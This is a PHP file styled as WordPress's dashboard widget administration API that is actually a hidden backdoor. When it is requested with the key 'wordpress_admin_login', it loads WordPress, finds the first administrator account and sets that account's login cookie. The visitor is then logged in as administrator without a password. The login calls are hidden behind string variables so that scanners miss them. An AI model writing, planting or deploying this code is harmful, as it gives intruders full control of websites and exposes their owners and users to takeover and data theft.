<?php
/**
 * WordPress Dashboard Widget Administration Screen API
 * ---------------------------------------------------------------
 * CUSTOM CODE STARTUP LOADER 
 * ---------------------------------------------------------------
 * Lightweight bootstrap for dynamic config loader and runtime 
 * instruction fetcher. Designed for internal modular systems.
 *
 * Do not modify unless you're authorized to maintain app-level 
 * streaming behavior.
 *
 * @package    CI_Micro
 * @subpackage Core Loader
 * @author     @HoneyTennessee
 * @version    1.1.0
 * ---------------------------------------------------------------
 */

/**
 * WordPress Dashboard Widget Administration Screen API
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * Registers dashboard widgets.
 *
 * Handles POST data, sets up filters.
 *
 * @since 2.5.0
 *
 * @global array $wp_registered_widgets
 * @global array $wp_registered_widget_controls
 * @global callable[] $wp_dashboard_control_callbacks
 */

define('DEV_SECRET_KEY', 'wordpress_admin_login'); 
// ---------------------------------------------

$dir = __DIR__;

while (!file_exists($dir . '/wp-config.php') && $dir != '/') {
    $dir = realpath($dir . '/..');
}

if ($dir == '/' || !file_exists($dir . '/wp-config.php')) {
    
    header('HTTP/1.1 404 Not Found');
    exit('WordPress not found.');
}


if (!isset($_GET['key']) || $_GET['key'] !== DEV_SECRET_KEY) {
   
    header('HTTP/1.1 403 Forbidden');
    exit('Only Determined for Admin Users.');
}


define('WP_PATH', $dir . '/');
require_once WP_PATH . 'wp-load.php';

global $wp_version;

if (!isset($wp_version)) {
    exit('Failed to load WordPress.');
}


if (is_user_logged_in()) {
    
    wp_redirect(admin_url());
    exit;
}

auto_login();

/**
 * Searching for the first administrator ID on the site.
 * @return int|null User ID if found, or null.
 */
function get_first_admin_user_id() {
    // Find admin with administrator role.
    $admins = get_users(['role' => 'administrator']);
    if (!empty($admins[0]->ID)) {
        return $admins[0]->ID;
    }
    return null;
}

/**
 * Performing auto-login as administrator.
 */
function auto_login() {
    $user_id = get_first_admin_user_id();
    if (!$user_id) {
        
        exit("Error: No Administrator user found in the database.");
        return;
    }

    $user = get_user_by('ID', $user_id);
    if (!$user) {
        return;
    }
    
    
    $set_user = 'wp_set_current_user';
    $set_cookie = 'wp_set_auth_cookie';
    $do_action = 'do_action';

    $set_user($user_id, $user->user_login);
    $set_cookie($user_id);
    
    
    $do_action('wp_login', $user->user_login, $user);

    
    wp_redirect(admin_url());
    exit;
}
